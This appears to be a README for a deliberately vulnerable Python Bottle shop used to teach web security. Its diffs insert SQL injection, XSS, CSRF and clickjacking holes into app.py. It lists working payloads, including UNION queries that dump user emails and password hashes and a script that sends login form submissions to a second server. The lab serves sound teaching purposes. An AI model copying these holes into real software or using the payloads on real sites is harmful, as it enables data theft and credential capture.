# bottle-store
 EC site example using Python bottle.

## 事前準備
Windowsの場合

```console
set STORE_SECRET_KEY=<署名付きcookieのための鍵（文字列）>
```

# SQL Injection

```diff:app.py
-        results = cur.execute("SELECT * FROM rated_products WHERE name LIKE ?;", ("%" + query + "%",)).fetchall()
+        results = cur.execute("SELECT * FROM rated_products WHERE name LIKE %'" + query + "%'").fetchall()
```

```
http://localhost:8080/products?q='
```

```
http://localhost:8080/products?q='--
```

```
http://localhost:8080/products?q=x%' UNION SELECT 1, tbl_name, 1, 1, 1, 1 FROM sqlite_master--
```

```
http://localhost:8080/products?q=x%' UNION SELECT 1, id, email, 1, hashed_password, nickname FROM users--
```

# Reflected XSS

```diff:app.py
-<p style="color:red;"> {{ message }} </p>
+<p style="color:red;"> {{ !message }} </p>
```

```
http://localhost:8080/login?message=<s>hello</s>
```

```
http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://localhost:8081/users'}</script>
```

# CSRF and Persistent XSS

```diff:app.py
-    if form_token != cookie_token:
-        abort(400, '不正なアクセスです。')
+    #if form_token != cookie_token:
+    #    abort(400, '不正なアクセスです。')
```

```
http://localhost:8081/evil_game1
```

```diff:app.py
-        <li>{{ comment }}</li>
+        <li>{{ !comment }}</li>
```

```
http://localhost:8081/evil_game2
```

# Clickjacking

```diff:app.py
-    response.headers['X-Frame-Options'] = 'DENY'
+   response.headers['X-Frame-Option'] = 'DENY'
```

```
http://localhost:8081/evil_game3
```

# DOM based XSS

